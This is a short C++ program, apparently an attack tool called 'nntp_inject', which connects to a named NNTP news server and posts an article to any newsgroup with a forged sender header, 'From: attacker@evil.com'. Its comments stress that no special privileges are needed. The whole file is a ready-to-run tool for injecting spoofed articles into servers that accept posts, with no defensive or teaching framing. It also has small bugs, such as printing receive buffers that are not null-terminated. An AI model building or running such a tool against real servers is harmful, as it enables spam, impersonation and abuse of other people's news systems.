// Compile: g++ -o nntp_inject nntp_inject.cpp
// Run: ./nntp_inject <server> <port> <newsgroup> <subject> <body>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string>

class NNTPInjector {
private:
    int sock;
    std::string server;
    int port;
    
public:
    NNTPInjector(const std::string& s, int p) : server(s), port(p) {}
    
    bool connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return false;
        
        struct hostent* host = gethostbyname(server.c_str());
        if (!host) return false;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr.s_addr, host->h_addr, host->h_length);
        
        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            return false;
        }
        
        char buffer[1024];
        recv(sock, buffer, sizeof(buffer), 0);
        return true;
    }
    
    void inject(const std::string& group, const std::string& subject, 
                const std::string& body) {
        std::string post = "POST\r\n";
        send(sock, post.c_str(), post.length(), 0);
        
        char buffer[1024];
        recv(sock, buffer, sizeof(buffer), 0);
        
        std::string article = 
            "Newsgroups: " + group + "\r\n"
            "Subject: " + subject + "\r\n"
            "From: attacker@evil.com\r\n"
            "\r\n"
            + body + "\r\n"
            ".\r\n";
        
        send(sock, article.c_str(), article.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
        
        std::cout << "Article posted: " << buffer << std::endl;
    }
    
    ~NNTPInjector() { if (sock >= 0) close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <server> <port> <group> <subject> <body>\n";
        return 1;
    }
    NNTPInjector injector(argv[1], atoi(argv[2]));
    if (injector.connect()) {
        injector.inject(argv[3], argv[4], argv[5]);
    }
    return 0;
}